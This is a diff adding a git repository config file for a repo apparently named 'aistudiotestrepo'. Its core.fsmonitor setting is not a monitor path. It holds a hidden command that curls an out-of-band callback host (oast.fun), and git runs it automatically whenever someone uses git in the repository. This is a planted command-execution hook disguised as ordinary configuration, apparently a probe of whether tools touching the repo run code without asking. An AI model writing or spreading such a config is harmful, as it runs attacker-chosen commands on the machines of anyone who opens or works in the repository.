@@ -1,0 +1,12 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	fsmonitor = "curl https://d45ldk40ekkp4fqir4h0yn9ge1ixymks6.oast.fun/test &"
+[remote "origin"]
+	url = https://github.com/arnodorian1337/aistudiotestrepo
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+	remote = origin
+	merge = refs/heads/main
